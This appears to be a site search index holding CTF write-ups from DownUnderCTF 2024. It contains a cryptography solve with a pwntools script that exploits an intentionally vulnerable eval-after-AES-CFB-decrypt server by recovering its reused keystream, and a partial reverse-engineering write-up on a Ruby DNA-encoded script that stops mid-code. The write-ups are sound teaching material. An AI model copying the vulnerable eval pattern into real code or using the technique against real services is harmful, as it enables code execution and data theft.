{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Event: Down Under CTF 2024. Duration: 48hours Team: 418WeAreTeapots Website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public Thank you to team 418WeAreTeapots for taking this journey with me and commiting long hours over weekends: ImTheProblem samiam abi2050 betactf HakerSanta meowsite JamzSlime","title":"DownUnderCTF 2024 Writeups"},{"location":"decrypt_eval/","text":"Prologue \u00b6 Difficulty: easy Category: cryptography Solved: 197 Description This server decrypts user input and evaluates it. Please use your magical malleability mastership to retrieve the flag! Input files: decrypt-then-eval.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #!/usr/bin/env python3 from Crypto.Cipher import AES import os KEY = os . urandom ( 16 ) IV = os . urandom ( 16 ) FLAG = os . getenv ( 'FLAG' , 'DUCTF {testflag} ' ) def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) try : print ( eval ( aes . decrypt ( ct ))) except Exception : print ( 'invalid ct!' ) if __name__ == '__main__' : main () NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Analysis \u00b6 We got only one file to start with: 1 2 3 4 5 6 7 8 9 10 11 12 KEY = os . urandom ( 16 ) # AES params IV = os . urandom ( 16 ) FLAG = os . getenv ( 'FLAG' , 'DUCTF {testflag} ' ) # flag variable this will be our target def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) # read input string aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) # create AES cipher try : print ( eval ( aes . decrypt ( ct ))) # decrypt input string, evaluate result value except Exception : print ( 'invalid ct!' ) Our goal is to get aes.decrypt return string FLAG , then evaluation of it will print value of the FLAG variable back to us. AES is considered to be a secure algorithm. If its used correctly - its practically unbreakable. The key part of this statement is \"if used correctly\". The key issue of the implementation is that it AES.new is created afresh for every user input. Given IV and KEY are same every time, same cipher keystream is generated for each input. Combined with the fact that CFB mode is used, we can control result of decryption even though we will never know values of KEY and IV . Lets review strategy of controlling output of AES description in CFB mode when same keystream is applied to every input that we provide. Program executes following algorithm: Read used input; Generate same keystream every time for given KEY nad IV XOR input with keystream Evaluate result If expression is evaluated successfully - print result, otherwise print \"invalid ct!\" If we know the keystream, we can easily construct input that will give us any desired output. For example if first keystream byte was 0x67 and we would want it to be 'F' (ascii value 0x46) then input we are lookign for is 0x67 ^ 0x46 = 0x21 . Same calculation works for any other byte value of the keystream. Attempt 1 \u00b6 How would we find the keystream? My first idea was to loop through all possible inputs until I get first and last characters to be double quotes, then everything is the middle will be considered as string that will be printed back. Once I have bytes the middle, I can calculate input. Pseudocode that I used for this: attempt_1.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 input = [ 0 ] * 16 # this is our input 16 bytes long (source code mentioned segment size 128) # when same byte of keystream is XOR-ed with 256 different values in input # output will also cover 256 possible values # one of them will be double quote that I am looking for for i in range ( 256 ): # try all possible first bytes for j in range ( 256 ): # try all possible last bytes input [ 0 ] = i # set first byte to i, last byte to j, all others will be 0 input [ 15 ] = j io . sendline ( binascii . hexlify ( bytearray ( input ))) # send input to the decrypt-eval program response = io . recvline () . strip () # read result line # if we got something interesting - print it, I expect to double quoted string and single quoted # and maybe some other inputs that are randomly valid if b 'invlaid ct!' not in line : print ( \"We received response that is not error: \" , line ) I've run the program and to my surprise I got nothing. There must be some other evaluation errors. I've modified source code of the decrypt-eval program to include more debug information printed while keeping functionality intact and increasing performance. With this version I can iterate much quicker: modified decrypt-then-eval.py 1 2 3 4 5 6 7 8 9 10 aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) # create AES instance at the start of the program keysream = aes . decrypt ( bytearray ( 16 )) # by using input [0,0,0,0....0] extract keystream def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) try : print ( eval ( xor_arrays ( keysream , ct ))) # xor keystream with provided input except Exception as e : print ( 'invalid ct!' , e ) # add exception details to the message Once I rerun my enumeration script I found errors of the eval: source code string cannot contain null bytes; invalid utf8 encoding Looks like there is a bad sequence of bytes somewhere in the middle of the string. So far, all input middle bytes were 0. I think we should try different value to deal with encoding problems. For nullbyte error we should try both 0 and 1 as input (only one may produce null-byte, not both at the same time). Pair 127,128 should take care of invalid UTF-8 sequence. UTF8 encoded characters are variable length byte sequences. It means that frequently used characters like latin alphabet, digits will take only 1 byte, and some less frequently used (emoji etc) assign 2-3 byte sequences. Decoding process is quite straightforward: first bit has a special meaning, its a flag indicating that current byte is final byte of codepoint. Remaining bits are concatenated to form codepoint value. For example: 1 2 3 4 0XXXXXXX -> 1 byte sequence, codepoint is XXXXXXX 1AAAAAAA 0BBBBBBB -> 2 byte sequence codepoints is AAAAAAABBBBBBB 1AAAAAAA 1BBBBBBB 0CCCCCCC -> 3 byte sequence codepoint is AAAAAAABBBBBBBCCCCCCC ... 1 byte UTF-8 symbols are all defined (matches ascii table for backwards compatibility), 2+ byte sequences have gaps and not every codepoint is defined (ie valid). This is where we get encoding errors. If all characters were 1byte sequences, we would not have undefined codepoints error. Pair 127, 128 should take care of it - flips highes bit, therefore we can reach a sequence in output where every byte is starting with 0 and is not a null-byte. The resulting candidate values to try for input bytes 1..14 are [0, 1, 127, 128] . Attempt 2 \u00b6 Here is script to enumerate through all values 0..255 for bytes 0 and 15, and vocabulary [0, 1, 127, 128] for bytes 1..14 as discussed earlier to deal with encoding errors. Feel free to skip implementation of the function input_generator as long as you understand the sequence that its producing and reasoning why we want this sequence (I think implementation is not too important for understanding the challenge). Loop in the end of the snippet is mostly the same as before. attempt_2.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # Generate sequence of states: # [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... # [255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... # [256, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [0, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... def input_generator (): state = [ 0 ] * 16 possible_values = [ range ( 256 ) if i == 0 or i == 15 else [ 0 , 1 , 127 , 128 ] for i in range ( 16 )] while True : yield [ possible_values [ i ][ state [ i ]] for i in range ( len ( state ))] for i in range ( len ( state )): if state [ i ] < len ( possible_values [ i ]) - 1 : state [ i ] += 1 break else : if i == len ( state ) - 1 : return state [ i ] = 0 for state in input_generator (): io . sendline ( binascii . hexlify ( bytearray ( state ))) # send input to local bynary response = io . recvline () . strip () # read result line # if we got something interesting - print it, I expect to double quoted string and single quoted # and maybe some other inputs that are randomly unique if b 'invlaid ct!' not in line : print ( \"We received response that is not error: \" , line ) While the script is running I had some time (actually quite a lot of time) to calculate total number of iterations. The formula is trivial: number of possible values for byte 0 * number of possible values for byte 1 * number of values for byte 2 * ... 256 * (4 ** 14) * 256 = 17592186044416 No wonder it takes a lot of time! Immediate thought was to reduce number of states for bytes 1..14 from [0, 1, 127, 128] to [0, 128] , unless we are very unlucky this should also work. Its also easy to update the script. But it doesn't seem to be enough. On the second thought, I am running against local application that performs no cryptography, but only XOR of two arrays. Its magnitudes faster than remote script. Therefore, proper solution should finish locally under few seconds. Besides that, all heavy lifting of cryptography is done on the server side, its very unlikely author expects all teams to run thousands of cryptography iterations each, this would be nontrivial question for scalability/costs. Attempt 3 \u00b6 My new idea for desired output: first byte is digit, second byte is # , other bytes doesn't matter as they will be treated as comment and hence ignored. Complexity of native implementation of such algorithm would be 256*256 , but I am sure given all digits are consecutive in ascii table and any of them works for us, there is a smart lookup of first byte that will reduce algorithm complexity to 25*256 iterations. Quick prototyping only to got me a disappointing discovery: value for eval should be a valid python source file without nullbytes and invalid codepoints, even if its a comment. At this moment it became clear that I am looking in the wrong direction. Therefore, I went back to the task description and original source code. Then it struck me: CFB is a stream cipher, it means I can provide as little as 1 byte and output will also be 1 byte (compared to block ciphers that even for 1 byte input are adding padding and produce fixed blocks of output). Attempt 4 \u00b6 Algorithm: Iterate through all possible values of byte 0 (0..255) until we receive digit as an output; Calculate keystream byte using formula k[i] = input[i] ^ ord(output[i]) Calculate input for byte 0 that will produce a space as output using formula input[0] = k[0] ^ ord(' ') Use value from step 3 as prefix, repeat step 1-3 to calculate other keystream bytes. Now we can calculate input that will produce FLAG : input[0] = k[i] ^ ord('F') , input[1] = k[1] ^ ord('L') . Complexity of the algorithm is 4*256 iterations. solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30020 io = remote ( remote_server , remote_port ) else : io = process ([ \"python\" , \"decrypt-then-eval.py\" ]) keystream = [] # store keystream values we idenitified so far for j in range ( 4 ): # we will repeat for 4 bytes for i in range ( 256 ): # try all possible values for next byte io . recvuntil ( b ': ' ) # wait for decrypt-then-eval.py to init # use keystream prefix XORed with space (eval trims spaces) as prefix # and append candidate value of next input `i` io . sendline ( binascii . hexlify ( bytearray ([ p ^ ord ( ' ' ) for p in keystream ]) + i . to_bytes ())) # read result line = io . recvline () . strip () if b 'invalid ct!' not in line : # if not error if line == b '0' : # if result is 0, technically we can stop on any digit, but its not a substantial difference keystream . append ( i ^ ord ( '0' )) # append keystream value we found break # on the the next byte io . recvuntil ( b ': ' ) # calculate input that once decrypted produces FLAG payload = bytearray ([ keystream [ 0 ] ^ ord ( 'F' ), keystream [ 1 ] ^ ord ( 'L' ), keystream [ 2 ] ^ ord ( 'A' ), keystream [ 3 ] ^ ord ( 'G' )]) io . sendline ( binascii . hexlify ( payload )) flag = io . recvline () . strip () print ( f ' { flag =} ' ) io . close () Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Decrypt then eval"},{"location":"decrypt_eval/#prologue","text":"Difficulty: easy Category: cryptography Solved: 197 Description This server decrypts user input and evaluates it. Please use your magical malleability mastership to retrieve the flag! Input files: decrypt-then-eval.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #!/usr/bin/env python3 from Crypto.Cipher import AES import os KEY = os . urandom ( 16 ) IV = os . urandom ( 16 ) FLAG = os . getenv ( 'FLAG' , 'DUCTF {testflag} ' ) def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) try : print ( eval ( aes . decrypt ( ct ))) except Exception : print ( 'invalid ct!' ) if __name__ == '__main__' : main () NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"decrypt_eval/#my-struggle","text":"","title":"My struggle"},{"location":"decrypt_eval/#analysis","text":"We got only one file to start with: 1 2 3 4 5 6 7 8 9 10 11 12 KEY = os . urandom ( 16 ) # AES params IV = os . urandom ( 16 ) FLAG = os . getenv ( 'FLAG' , 'DUCTF {testflag} ' ) # flag variable this will be our target def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) # read input string aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) # create AES cipher try : print ( eval ( aes . decrypt ( ct ))) # decrypt input string, evaluate result value except Exception : print ( 'invalid ct!' ) Our goal is to get aes.decrypt return string FLAG , then evaluation of it will print value of the FLAG variable back to us. AES is considered to be a secure algorithm. If its used correctly - its practically unbreakable. The key part of this statement is \"if used correctly\". The key issue of the implementation is that it AES.new is created afresh for every user input. Given IV and KEY are same every time, same cipher keystream is generated for each input. Combined with the fact that CFB mode is used, we can control result of decryption even though we will never know values of KEY and IV . Lets review strategy of controlling output of AES description in CFB mode when same keystream is applied to every input that we provide. Program executes following algorithm: Read used input; Generate same keystream every time for given KEY nad IV XOR input with keystream Evaluate result If expression is evaluated successfully - print result, otherwise print \"invalid ct!\" If we know the keystream, we can easily construct input that will give us any desired output. For example if first keystream byte was 0x67 and we would want it to be 'F' (ascii value 0x46) then input we are lookign for is 0x67 ^ 0x46 = 0x21 . Same calculation works for any other byte value of the keystream.","title":"Analysis"},{"location":"decrypt_eval/#attempt-1","text":"How would we find the keystream? My first idea was to loop through all possible inputs until I get first and last characters to be double quotes, then everything is the middle will be considered as string that will be printed back. Once I have bytes the middle, I can calculate input. Pseudocode that I used for this: attempt_1.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 input = [ 0 ] * 16 # this is our input 16 bytes long (source code mentioned segment size 128) # when same byte of keystream is XOR-ed with 256 different values in input # output will also cover 256 possible values # one of them will be double quote that I am looking for for i in range ( 256 ): # try all possible first bytes for j in range ( 256 ): # try all possible last bytes input [ 0 ] = i # set first byte to i, last byte to j, all others will be 0 input [ 15 ] = j io . sendline ( binascii . hexlify ( bytearray ( input ))) # send input to the decrypt-eval program response = io . recvline () . strip () # read result line # if we got something interesting - print it, I expect to double quoted string and single quoted # and maybe some other inputs that are randomly valid if b 'invlaid ct!' not in line : print ( \"We received response that is not error: \" , line ) I've run the program and to my surprise I got nothing. There must be some other evaluation errors. I've modified source code of the decrypt-eval program to include more debug information printed while keeping functionality intact and increasing performance. With this version I can iterate much quicker: modified decrypt-then-eval.py 1 2 3 4 5 6 7 8 9 10 aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) # create AES instance at the start of the program keysream = aes . decrypt ( bytearray ( 16 )) # by using input [0,0,0,0....0] extract keystream def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) try : print ( eval ( xor_arrays ( keysream , ct ))) # xor keystream with provided input except Exception as e : print ( 'invalid ct!' , e ) # add exception details to the message Once I rerun my enumeration script I found errors of the eval: source code string cannot contain null bytes; invalid utf8 encoding Looks like there is a bad sequence of bytes somewhere in the middle of the string. So far, all input middle bytes were 0. I think we should try different value to deal with encoding problems. For nullbyte error we should try both 0 and 1 as input (only one may produce null-byte, not both at the same time). Pair 127,128 should take care of invalid UTF-8 sequence. UTF8 encoded characters are variable length byte sequences. It means that frequently used characters like latin alphabet, digits will take only 1 byte, and some less frequently used (emoji etc) assign 2-3 byte sequences. Decoding process is quite straightforward: first bit has a special meaning, its a flag indicating that current byte is final byte of codepoint. Remaining bits are concatenated to form codepoint value. For example: 1 2 3 4 0XXXXXXX -> 1 byte sequence, codepoint is XXXXXXX 1AAAAAAA 0BBBBBBB -> 2 byte sequence codepoints is AAAAAAABBBBBBB 1AAAAAAA 1BBBBBBB 0CCCCCCC -> 3 byte sequence codepoint is AAAAAAABBBBBBBCCCCCCC ... 1 byte UTF-8 symbols are all defined (matches ascii table for backwards compatibility), 2+ byte sequences have gaps and not every codepoint is defined (ie valid). This is where we get encoding errors. If all characters were 1byte sequences, we would not have undefined codepoints error. Pair 127, 128 should take care of it - flips highes bit, therefore we can reach a sequence in output where every byte is starting with 0 and is not a null-byte. The resulting candidate values to try for input bytes 1..14 are [0, 1, 127, 128] .","title":"Attempt 1"},{"location":"decrypt_eval/#attempt-2","text":"Here is script to enumerate through all values 0..255 for bytes 0 and 15, and vocabulary [0, 1, 127, 128] for bytes 1..14 as discussed earlier to deal with encoding errors. Feel free to skip implementation of the function input_generator as long as you understand the sequence that its producing and reasoning why we want this sequence (I think implementation is not too important for understanding the challenge). Loop in the end of the snippet is mostly the same as before. attempt_2.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # Generate sequence of states: # [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... # [255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... # [256, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [0, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... def input_generator (): state = [ 0 ] * 16 possible_values = [ range ( 256 ) if i == 0 or i == 15 else [ 0 , 1 , 127 , 128 ] for i in range ( 16 )] while True : yield [ possible_values [ i ][ state [ i ]] for i in range ( len ( state ))] for i in range ( len ( state )): if state [ i ] < len ( possible_values [ i ]) - 1 : state [ i ] += 1 break else : if i == len ( state ) - 1 : return state [ i ] = 0 for state in input_generator (): io . sendline ( binascii . hexlify ( bytearray ( state ))) # send input to local bynary response = io . recvline () . strip () # read result line # if we got something interesting - print it, I expect to double quoted string and single quoted # and maybe some other inputs that are randomly unique if b 'invlaid ct!' not in line : print ( \"We received response that is not error: \" , line ) While the script is running I had some time (actually quite a lot of time) to calculate total number of iterations. The formula is trivial: number of possible values for byte 0 * number of possible values for byte 1 * number of values for byte 2 * ... 256 * (4 ** 14) * 256 = 17592186044416 No wonder it takes a lot of time! Immediate thought was to reduce number of states for bytes 1..14 from [0, 1, 127, 128] to [0, 128] , unless we are very unlucky this should also work. Its also easy to update the script. But it doesn't seem to be enough. On the second thought, I am running against local application that performs no cryptography, but only XOR of two arrays. Its magnitudes faster than remote script. Therefore, proper solution should finish locally under few seconds. Besides that, all heavy lifting of cryptography is done on the server side, its very unlikely author expects all teams to run thousands of cryptography iterations each, this would be nontrivial question for scalability/costs.","title":"Attempt 2"},{"location":"decrypt_eval/#attempt-3","text":"My new idea for desired output: first byte is digit, second byte is # , other bytes doesn't matter as they will be treated as comment and hence ignored. Complexity of native implementation of such algorithm would be 256*256 , but I am sure given all digits are consecutive in ascii table and any of them works for us, there is a smart lookup of first byte that will reduce algorithm complexity to 25*256 iterations. Quick prototyping only to got me a disappointing discovery: value for eval should be a valid python source file without nullbytes and invalid codepoints, even if its a comment. At this moment it became clear that I am looking in the wrong direction. Therefore, I went back to the task description and original source code. Then it struck me: CFB is a stream cipher, it means I can provide as little as 1 byte and output will also be 1 byte (compared to block ciphers that even for 1 byte input are adding padding and produce fixed blocks of output).","title":"Attempt 3"},{"location":"decrypt_eval/#attempt-4","text":"Algorithm: Iterate through all possible values of byte 0 (0..255) until we receive digit as an output; Calculate keystream byte using formula k[i] = input[i] ^ ord(output[i]) Calculate input for byte 0 that will produce a space as output using formula input[0] = k[0] ^ ord(' ') Use value from step 3 as prefix, repeat step 1-3 to calculate other keystream bytes. Now we can calculate input that will produce FLAG : input[0] = k[i] ^ ord('F') , input[1] = k[1] ^ ord('L') . Complexity of the algorithm is 4*256 iterations. solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30020 io = remote ( remote_server , remote_port ) else : io = process ([ \"python\" , \"decrypt-then-eval.py\" ]) keystream = [] # store keystream values we idenitified so far for j in range ( 4 ): # we will repeat for 4 bytes for i in range ( 256 ): # try all possible values for next byte io . recvuntil ( b ': ' ) # wait for decrypt-then-eval.py to init # use keystream prefix XORed with space (eval trims spaces) as prefix # and append candidate value of next input `i` io . sendline ( binascii . hexlify ( bytearray ([ p ^ ord ( ' ' ) for p in keystream ]) + i . to_bytes ())) # read result line = io . recvline () . strip () if b 'invalid ct!' not in line : # if not error if line == b '0' : # if result is 0, technically we can stop on any digit, but its not a substantial difference keystream . append ( i ^ ord ( '0' )) # append keystream value we found break # on the the next byte io . recvuntil ( b ': ' ) # calculate input that once decrypted produces FLAG payload = bytearray ([ keystream [ 0 ] ^ ord ( 'F' ), keystream [ 1 ] ^ ord ( 'L' ), keystream [ 2 ] ^ ord ( 'A' ), keystream [ 3 ] ^ ord ( 'G' )]) io . sendline ( binascii . hexlify ( payload )) flag = io . recvline () . strip () print ( f ' { flag =} ' ) io . close ()","title":"Attempt 4"},{"location":"decrypt_eval/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"dna/","text":"Prologue \u00b6 Difficulty: easy Category: reverse engineering Solved: 148 Description Our flightless birds can run upto 50km/h but we want them to go faster. I've been messing with a mutigen but it seems to have corrupted. Can you help me recover this research? Input files: dna.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 require \"doublehelix\" AT A -- T T - - A G ---- C G ---- -- C T --- A G -- C AT GC T -- G - - T ---- A A --- T T --- A G --- C C -- G AT CG - T A --- T G --- A -- T G ---- C G C -- C C C T -- A A -- T A -- T G - -- C A ---- T G --- C G -- C GC CG G -- C A --- G ---- C T - -- A C ---- G T --- G -- C A GC T -- A A - T ---- T C ---- G -- - T G --- C T -- A AT A A - T --- A T - - A G ---- C G ---- C G --- C T -- A AT C G - C C -- G C -- - G G ---- C -- - T G - C T -- A G AT -- T T --- ---- T T -- - A ---- C --- G G -- C AT C A - C T ---- A T ---- A A ---- G - C C - G T C G - C -- G ---- C - -- G G - - C -- G A -- T G GC G -- C C --- G C -- - G G --- C A --- G - - C T -- A A TA T -- A -- ---- G -- - C A - -- T T - - A -- T GC GC T - A A --- T T -- - A T ---- A ---- G -- C T -- A GC A A - A -- T C ---- G C ---- G ---- C G --- C G - C CG GC T -- A T --- G ---- C G -- - C A --- A -- G -- GC AT A -- T T --- A -- T T ---- A G --- T -- A G -- C C GC A - T G --- C C --- G --- T - - A G --- C -- A A G G -- C A -- T C - -- G A --- T ---- C T - T - CG C G - C G --- C G - C G --- --- --- T - A G C G - A -- T G ---- C T --- A T --- A G -- C G - TA A C -- G G --- C ---- G ---- C C ---- G G --- C T - A TA G -- C A --- T -- - C ---- T G ---- G --- A -- T AT GC - A T --- G - -- C G --- C T - -- A A -- T A -- T C TA A - T T - - A ---- T A ---- T T ---- A A -- T G -- C A TA A - T --- G - -- C T ---- A T --- A - - C C -- T CG A - T NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Disclaimer : this is the first time I've opened ruby script, therefore technique is primitive and far from optimal. At this point I can't tell if file we were given is a valid ruby script or first we have to decode the DNA it somehow before running. There is only one searchable string to start with: require \"doublehelix\" (I don't believe googling all those AT TA can be helpful). Quickly landed at following library on github https://github.com/mame/doublehelix . Entire encoding and decoding is implemented in less than 20 lines : source code of doublehelix.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" } eval ( [ $code . gsub ( /../ ) { | s | dict [ s ] } ]. pack ( \"b*\" )) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end I wasn't able to install the package in my machine and run hello world (probably my environment is not properly set up). But, replacing require \"doublehelix\" with contents of the library did the trick. After that I've tried to run source code that we were given in the challenge. Of cause, it was not so easy: task description mentions but it seems to have corrupted. Can you help me recover this research? So we have to fix the script first. At lines 7 and 12 of the source code we can see that there are only 4 possible pairs of gens (AT, CG, GC, TA). As a first path I went through the script and repaired all lines that included 1 letter: lines with A should have T lines with T should have A liens with C should have G lines with G should have C Its easy to pick a sequence to use (for example AT or TA) visually (fit DNA picture). Now lets work on empty lines. We will have to guess what it is. For that I've added few modifications: modied dna.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do # extended dictianary with 4 new gens: V0, V1, V2, V3 that produce same bits as existing ones # now I can enter my guesses and still able to distinct given input from my guesses dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" , \"V0\" => \"00\" , \"V1\" => \"01\" , \"V2\" => \"10\" , \"V3\" => \"11\" } # print concatenated source code for debug purposes puts $code res = [ $code . gsub ( /../ ) { | s | dict [ s ] } ] # print decoded bits for debug purposes puts res puts res . pack ( \"b*\" ) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end # removed all spaces and punctuation symbols as it was giving errors and not used in decoding anyway AT AT TA GC GC ... GC AT AT TA AT TA # I've replaced all empty lines with V0 as a starting point V0 CG GC AT CG ... Now lets run it: 1 2 3 4 $ ruby dna_modified.rb ATATTAGCGCGCTAGCATGCTAGCTAATTAGCCGATCGATATGCATGCGCGCGCGCTAATATGCATGCGCGCCGGCATGCTACGTAGCTAGCTAATATCGATGCTAATTAATTATAGCGCGCTAATGCGCCGCGGCATGCTAGCATATTAATTAV0CGGCATCGATGCTATAATGCCGTACGGCV0GCCGGCCGATGCGCGCCGCGGCATGCTAATTATAV0V0GCATTAATGCGCTAATTATAV0GCTAGCTAATATCGCGGCGCGCCGGCTATAGCGCATATGCGCATATTAATTAGCTAGCGCGCATGCCGATTAGCTATAGCGCATCGATGCTATACGGCGCGCGCGCV0ATTAGCGCGCATGCTATAGCGCTATACGGCCGGCCGGCTATAV0GCATGCATGCGCATATGCTATAGCGCTAATATGCTAATTAATATTAATGCATTAATV0GCTATAGCCGATCGAT 0000111010101110001011101100111001000100001000101010101011000010001010100110001011011110111011000001001011001100111110101011001010010110001011100000110011010110000100101111001001110110011001100100101010010110001011001111010110001100101011001111011011101100000101101010011011111010000010100000110011101110101000100100111011111010000100101111011010101010010011101010001011111010111101100110011011110110001000101000001011111010110000101100110000110010001100011011111001000100 puts \"DUCTF{7H3_Mit0kHOnfRi4\ufffd15o7he_P0wEr_HoUrE_ofoDA_C3L\ufffd}\" Looking good, we can even read most of the flag (except for few characters where guess is wrong). We can continue this in python now: 1 2 3 4 5 6 7 8 9 10 11 12 # source code sequence we recieve from ruby input = 